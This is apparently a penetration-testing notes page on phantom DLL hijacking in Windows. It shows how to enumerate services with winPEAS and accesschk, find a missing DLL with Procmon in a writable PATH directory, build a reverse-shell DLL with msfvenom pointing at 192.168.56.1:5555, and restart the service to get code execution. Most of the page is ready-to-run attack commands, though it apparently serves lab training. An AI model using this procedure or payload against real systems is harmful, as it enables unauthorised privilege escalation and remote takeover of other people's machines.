# Phantom DLL Injection

in this type of DLL we target a missing dll and place our own dll instead.

Use winPEAS to enumerate non-Windows services:

```text
winPEASany.exe quiet servicesinfo
```

![](../../../../../.gitbook/assets/image%20%2871%29.png)

Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:

```text
accesschk.exe /accepteula -uvqc user dllsvc
```

![](../../../../../.gitbook/assets/image%20%2881%29.png)

The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:

```text
 sc qc dllsvc
```

![](../../../../../.gitbook/assets/image%20%2874%29.png)

![](../../../../../.gitbook/assets/image%20%2888%29.png)

in a real-world scenario we would download the executable to our own windows machine of analysis.then create a new service for the binary file that we copied and give it the path of the service binary and continue to the next steps:

create a service for the binary in our own system

```text
sc create binPath= c:\temp\dllhijackservice.exe type= own 
```

Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.

Add a new filter on the Process Name matching dllhijackservice.exe

![](../../../../../.gitbook/assets/image%20%2878%29.png)

On the main screen, deselect registry activity and network activity.

![](../../../../../.gitbook/assets/image%20%28102%29.png)

Start the service:

```text
net start dllsvc
```

![](../../../../../.gitbook/assets/image%20%2880%29.png)

​​Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the hijackme.dll file.

![](../../../../../.gitbook/assets/image%20%28103%29.png)

At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.

On Kali, generate a reverse shell DLL named hijackme.dll:

```text
msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.1 lport=5555 -f dll -o VirtualBox\ VMs/shares/hijackme.dll
```

Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:

```text
net stop dllsvc
net start dllsvc
```

![](../../../../../.gitbook/assets/image%20%2890%29.png)





